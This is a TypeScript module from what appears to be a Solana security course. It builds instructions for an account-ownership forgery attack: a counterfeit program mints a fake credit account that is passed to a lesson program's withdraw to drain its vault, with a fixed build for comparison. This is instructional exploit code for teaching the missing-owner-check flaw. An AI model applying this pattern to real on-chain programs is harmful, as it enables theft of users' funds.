/**
 * ownerChain.ts — lesson two's instructions, in bare web3.js.
 *
 * The pure half of the ownership attack: the selectors, the account lists and
 * the address derivation, with no connection and no React — the same split
 * `devnet.ts` makes for lesson one, for the same reason (the pool logic there is
 * testable without a network; the instruction layout here is too).
 *
 * The discriminators are not magic numbers. Anchor derives a selector as the
 * first eight bytes of `sha256("<namespace>:<name>")`, so each constant below is
 * pinned by a test to the hash it came from rather than to hand arithmetic:
 *
 *   sha256("global:forge")      -> 3f05d31cedc36e90
 *   sha256("global:withdraw")   -> b712469c946da122
 *   sha256("global:open_vault") -> b5f8e44306af25a7
 *
 * `withdraw`'s selector is byte-for-byte lesson one's, because the name is the
 * same — only the accounts struct behind it differs. That is worth saying: two
 * different programs, one shared selector, and nothing about the selector tells
 * them apart.
 *
 * The **accounts** are what differ, and they are the lesson:
 *
 *   forge:    forged (new, writable, signer) · payer (signer) · system program
 *   withdraw: vault (writable) · credit (read-only) · recipient (signer)
 *
 * `credit` is neither a signer nor owned by the attacked program here — it is
 * simply handed in, which is exactly what makes the forgery work.
 */

import { Keypair, PublicKey, type AccountMeta } from '@solana/web3.js';
import { isFilled } from '../config/verification';

/** sha256("global:forge")[0..8] — the counterfeit program's mint selector. */
export const FORGE_DISCRIMINATOR = Uint8Array.from([0x3f, 0x05, 0xd3, 0x1c, 0xed, 0xc3, 0x6e, 0x90]);

/** sha256("global:withdraw")[0..8] — the same selector lesson one's build uses. */
export const OWNER_WITHDRAW_DISCRIMINATOR = Uint8Array.from([183, 18, 70, 156, 148, 109, 161, 34]);

/** sha256("global:open_vault")[0..8] — `vault`'s PDA is the same seed for both builds. */
export const OPEN_VAULT_DISCRIMINATOR = Uint8Array.from([0xb5, 0xf8, 0xe4, 0x43, 0x06, 0xaf, 0x25, 0xa7]);

/** `b"vault"` — both builds derive their vault as a PDA of this one seed. */
export const VAULT_SEED = Uint8Array.from([118, 97, 117, 108, 116]);

/** `#[account]` discriminator (8) + `amount: u64` (8). */
export const CREDIT_SPACE = 16;

/** `#[account]` discriminator (8) + `authority: Pubkey` (32). */
export const OWNER_VAULT_SPACE = 40;

/** Lamports in one SOL. Named here so a page never carries the number itself. */
export const LAMPORTS_PER_SOL = 1_000_000_000;

/** A lamport amount as SOL, to two places — for showing a real balance. */
export function solAmount(lamports: number): string {
  return (lamports / LAMPORTS_PER_SOL).toFixed(2);
}

/** The vault's address for a build: PDA of `[b"vault"]` under that program. */
export function vaultPda(programId: PublicKey): PublicKey {
  return PublicKey.findProgramAddressSync([VAULT_SEED], programId)[0];
}

/** The `forge` instruction's data: the selector, then the amount as a LE u64. */
export function forgeInstructionData(amount: number): Uint8Array {
  const data = new Uint8Array(16);
  data.set(FORGE_DISCRIMINATOR, 0);
  new DataView(data.buffer).setBigUint64(8, BigInt(amount), true);
  return data;
}

/** `withdraw(ctx)` takes no arguments, so its data is the selector alone. */
export function ownerWithdrawInstructionData(): Uint8Array {
  return Uint8Array.from(OWNER_WITHDRAW_DISCRIMINATOR);
}

/** The accounts `forge` takes, in the order `Forge` declares them. */
export function forgeAccounts(
  forged: PublicKey,
  payer: PublicKey,
  systemProgram: PublicKey,
): AccountMeta[] {
  return [
    // `init` marks the new account a signer: the system program will not create
    // an account without its key signing for it.
    { pubkey: forged, isSigner: true, isWritable: true },
    { pubkey: payer, isSigner: true, isWritable: true },
    { pubkey: systemProgram, isSigner: false, isWritable: false },
  ];
}

/** The accounts `open_vault` takes, in the order `OpenVault` declares them. */
export function openVaultAccounts(
  vault: PublicKey,
  authority: PublicKey,
  systemProgram: PublicKey,
): AccountMeta[] {
  return [
    { pubkey: vault, isSigner: false, isWritable: true },
    { pubkey: authority, isSigner: true, isWritable: true },
    { pubkey: systemProgram, isSigner: false, isWritable: false },
  ];
}

/**
 * The accounts `withdraw` takes, in the order `Withdraw` declares them.
 *
 * `credit` is deliberately neither a signer nor writable: the whole attack is
 * that it is just an address handed in, owned by someone else.
 */
export function ownerWithdrawAccounts(
  vault: PublicKey,
  credit: PublicKey,
  recipient: PublicKey,
): AccountMeta[] {
  return [
    { pubkey: vault, isSigner: false, isWritable: true },
    { pubkey: credit, isSigner: false, isWritable: false },
    { pubkey: recipient, isSigner: true, isWritable: true },
  ];
}

/** What lesson two's run is told about the world before it plans anything. */
export interface OwnerRunConfig {
  /** Which build is attacked. Only the program id changes with this. */
  isFixed: boolean;
  vulnerableProgramId: string;
  fixedProgramId: string;
  /** The attacker's tool. It mints the forged credit; it is not the protocol. */
  counterfeitProgramId: string;
  /** Lamports the forged credit claims, and therefore what the vault must hold. */
  attackLamports: number;
}

/** What a run decided to do, once the program ids are known to be real. */
export interface OwnerTarget {
  programId: PublicKey;
  counterfeitProgramId: PublicKey;
  vault: PublicKey;
  /** The forged account's keypair — the only thing about it the runtime trusts. */
  creditKeypair: Keypair;
  /** Whoever receives the lamports, and the only signer on the transaction. */
  recipient: PublicKey;
  /** What the forged credit claims, in lamports. */
  amount: number;
}

export type OwnerPlan = { kind: 'run'; target: OwnerTarget } | { kind: 'notDeployed' };

/**
 * Decide what to attack, or that there is nothing deployed to call.
 *
 * Both program ids are checked before either becomes a `PublicKey`, so a
 * placeholder in the lesson data can never turn into an address. The credit
 * keypair and the recipient are injected rather than generated here: this stays
 * a pure function of its inputs, so a test can pin exactly what it produced.
 */
export function planOwnerRun(
  config: OwnerRunConfig,
  vault: PublicKey,
  creditKeypair: Keypair,
  recipient: PublicKey,
): OwnerPlan {
  const programIdBase58 = config.isFixed ? config.fixedProgramId : config.vulnerableProgramId;
  if (!isFilled(programIdBase58) || !isFilled(config.counterfeitProgramId)) {
    return { kind: 'notDeployed' };
  }

  return {
    kind: 'run',
    target: {
      programId: new PublicKey(programIdBase58),
      counterfeitProgramId: new PublicKey(config.counterfeitProgramId),
      vault,
      creditKeypair,
      recipient,
      amount: config.attackLamports,
    },
  };
}
